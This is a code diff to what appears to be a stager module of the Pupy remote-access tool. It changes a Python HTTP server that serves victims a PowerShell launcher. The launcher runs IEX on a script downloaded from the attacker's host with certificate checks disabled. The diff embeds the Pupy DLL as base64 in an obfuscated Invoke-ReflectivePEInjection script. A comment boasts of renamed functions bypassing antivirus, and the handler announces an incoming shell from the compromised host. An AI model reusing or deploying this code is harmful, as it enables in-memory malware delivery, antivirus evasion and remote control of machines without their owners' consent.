@@ -1,7 +1,5 @@
 #!/usr/bin/env python
 # -*- coding: UTF8 -*-
-# Code inspired from the awesome tool CrackMapExec: https://github.com/byt3bl33d3r/CrackMapExec/blob/b1e83227047a64cbe45145b8ebf5054640822317/cme/modules/pe_inject.py
-# Thanks to byt3bl33d3r
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 import os.path
 from pupylib.utils.term import colorize
@@ -15,22 +13,37 @@ from ssl import wrap_socket
 from base64 import b64encode
 import re
 
+from modules.lib.windows.powershell_upload import obfuscatePowershellScript, obfs_ps_script
+
 ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))
 
-url_random_one = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
-url_random_two = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
-url_random_three = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
+#url_random_one = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
+#url_random_two = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
+### url_random_one and url_random_two variables are fixed because if you break you ps1_neliner listener, the payload will be not be able to get stages -:(
+url_random_one = "eiloShaegae1"
+url_random_two = "IMo8oosieVai"
 
-def obfs_ps_script(script):
-    """
-    Strip block comments, line comments, empty lines, verbose statements,
-    and debug statements from a PowerShell source file.
-    """
-    # strip block comments
-    strippedCode = re.sub(re.compile('<#.*?#>', re.DOTALL), '', script)
-    # strip blank lines, lines starting with #, and verbose/debug statements
-    strippedCode = "\n".join([line for line in strippedCode.split('\n') if ((line.strip() != '') and (not line.strip().startswith("#")) and (not line.strip().lower().startswith("write-verbose ")) and (not line.strip().lower().startswith("write-debug ")) )])
-    return strippedCode
+def getInvokeReflectivePEInjectionWithDLLEmbedded(payload_conf):
+	'''
+	Return source code of InvokeReflectivePEInjection.ps1 script with pupy dll embedded
+	Ready for executing
+	'''
+	SPLIT_SIZE = 100000
+	x64InitCode, x86InitCode, x64ConcatCode, x86ConcatCode = "", "", "", ""
+	code = """
+	$PEBytes = ""
+	{0}
+	$PEBytesTotal = [System.Convert]::FromBase64String({1})
+	Invoke-ReflectivePEInjection -PEBytes $PEBytesTotal -ForceASLR
+	"""#{1}=x86dll
+	binaryX86=b64encode(get_edit_pupyx86_dll(payload_conf))
+	binaryX86parts = [binaryX86[i:i+SPLIT_SIZE] for i in range(0, len(binaryX86), SPLIT_SIZE)]
+	for i,aPart in enumerate(binaryX86parts):
+		x86InitCode += "$PEBytes{0}=\"{1}\"\n".format(i,aPart)
+		x86ConcatCode += "$PEBytes{0}+".format(i)
+	print(colorize("[+] ","green")+"X86 pupy dll loaded and {0} variables generated".format(i+1))
+	script = obfuscatePowershellScript(open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read())
+	return obfs_ps_script("{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1])))
 
 def create_ps_command(ps_command, force_ps32=False, nothidden=False):
     ps_command = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
@@ -77,19 +90,14 @@ class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
             self.end_headers()
 
             launcher = """
-            IEX (New-Object Net.WebClient).DownloadString('http://{server}:{port}/{url_random_two}');
-            $WebClient = New-Object System.Net.WebClient;
-            [Byte[]]$bytes = $WebClient.DownloadData('http://{server}:{port}/{url_random_three}');
-            {function_invoke} -ForceASLR -PEBytes $bytes""".format(  
+            IEX (New-Object Net.WebClient).DownloadString('http://{server}:{port}/{url_random_two}');""".format(  
                                                                                 server=self.server.link_ip,
                                                                                 port=self.server.link_port,
-                                                                                function_invoke=self.server.random_reflectivepeinj_name,
-                                                                                url_random_two=url_random_two, 
-                                                                                url_random_three=url_random_three
+                                                                                url_random_two=url_random_two
                                                                             )
             launcher = create_ps_command(launcher, force_ps32=True, nothidden=False)
             self.wfile.write(launcher)
-            print colorize("[+] ","green")+" Powershell script stage1 served !"
+            print colorize("[+] ","green")+"[Stage 1/2] Powershell script served !"
         
         elif self.path=="/%s" % url_random_two:
             self.send_response(200)
@@ -97,16 +105,9 @@ class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
             self.end_headers()
             code=open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read()
             code=code.replace("Invoke-ReflectivePEInjection", self.server.random_reflectivepeinj_name) # seems to bypass some av like avast :o)
-            self.wfile.write(obfs_ps_script(code))
-            print colorize("[+] ","green")+" powershell Invoke-ReflectivePEInjection.ps1 script served !"
-
-        elif self.path=="/%s" % url_random_three:
-            self.send_response(200)
-            self.send_header('Content-type','application/octet-stream')
-            self.end_headers()
-            raw = get_edit_pupyx86_dll(self.server.payload_conf)
-            self.wfile.write(raw)
-            print colorize("[+] ","green")+" pupy dllx86 script served !"
+            self.wfile.write(getInvokeReflectivePEInjectionWithDLLEmbedded(self.server.payload_conf))
+            print colorize("[+] ","green")+"[Stage 2/2] Powershell Invoke-ReflectivePEInjection script (with dll embedded) served!"
+            print colorize("[+] ","green")+"You should have a pupy shell in few seconds from this host..."
 
         else:
             self.send_response(404)
